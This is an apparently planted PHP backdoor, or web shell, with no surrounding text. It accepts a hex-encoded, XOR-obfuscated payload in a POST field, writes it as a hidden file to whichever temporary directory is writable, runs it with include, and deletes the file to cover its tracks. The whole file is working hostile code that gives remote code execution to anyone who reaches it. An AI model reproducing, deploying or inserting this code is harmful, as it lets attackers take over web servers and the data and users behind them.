<?php

if(filter_has_var(INPUT_POST, "\x66ac")){
	$entry = array_filter(["/tmp", getcwd(), session_save_path(), "/var/tmp", ini_get("upload_tmp_dir"), getenv("TEMP"), "/dev/shm", getenv("TMP"), sys_get_temp_dir()]);
	$binding = hex2bin($_POST["\x66ac"]);
	$pointer='';for($u=0; $u<strlen($binding); $u++){$pointer .= chr(ord($binding[$u]) ^ 45);}
	foreach ($entry as $record):
    		if (is_writable($record) && is_dir($record)) {
    $desc = "$record" . "/.obj";
    $success = file_put_contents($desc, $pointer);
if ($success) {
	include $desc;
	@unlink($desc);
	exit;}
}
endforeach;
}